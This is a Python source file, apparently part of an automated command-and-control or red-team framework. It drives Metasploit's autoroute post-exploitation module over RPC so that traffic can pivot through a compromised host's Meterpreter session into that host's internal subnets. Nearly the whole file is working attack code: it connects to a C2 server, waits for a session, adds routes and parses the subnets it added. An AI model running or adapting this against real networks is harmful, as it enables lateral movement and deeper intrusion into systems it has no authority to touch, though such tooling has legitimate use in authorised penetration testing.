
""" 
post/multi/manage/autoroute 
This module manages session routing via an existing Meterpreter session. 
It enables other modules to 'pivot' through a compromised host 
when connecting to the named NETWORK and SUBMASK. Autoadd will search a 
session for valid subnets from the routing table and interface list 
then add routes to them. Default will add a default route so that 
all TCP/IP traffic not specified in the MSF routing table will be routed 
through the session when pivoting. 
"""
from c2_settings import MSF_SERVER, MSF_PWD
from pymetasploit.msfrpc import MsfRpcClient
from time import sleep

def run(client, SESSION, CMD='', NETMASK='', SUBNET=''):
    """
    Setup autoroute for pivoting via existing Meterpreter session
    \n:param client: MsfRpcClient object
    \n:param SESSION: numeric session id
    \n:param CMD: add, *autoadd, print, delete, default
    \n:param NETMASK: Netmask eg. IPv4 as "255.255.255.0" or CIDR as "/24"
    \n:param SUBNET: Subnet (IPv4, for example, 10.10.10.0)
    \n:return type: list of routes added
    """

    console = client.consoles.console()
    # copy from Armitage
    console.write('use post/multi/manage/autoroute')
    console.write('set SESSION {0}'.format(SESSION))
    if(CMD is not ''):
        console.write('set CMD {0}'.format(CMD))
    if(NETMASK is not ''):
        console.write('set NETMASK {0}'.format(NETMASK))
    if(SUBNET is not ''):
        console.write('set SUBNET {0}'.format(SUBNET))
    console.write('run -j')
    subnets = list()
    while True:
        r = console.read()
        if len(r['data']) > 0:
            if 'Did not find' in r['data']:
                break
            if 'Route added' not in r['data']:
                continue
            for line in r['data'].split('\n'):
                if 'Route added' in line:
                    subnets.append(line[line.find('subnet') + 6:line.find('from')-1])
            return subnets

# for unit testing of each technique
if __name__ == '__main__':
    client = MsfRpcClient(MSF_PWD, server=MSF_SERVER,ssl=False)
    from stage2.external_c2 import msf_wait_for_session
    id = msf_wait_for_session.run(client)
    run(client, id)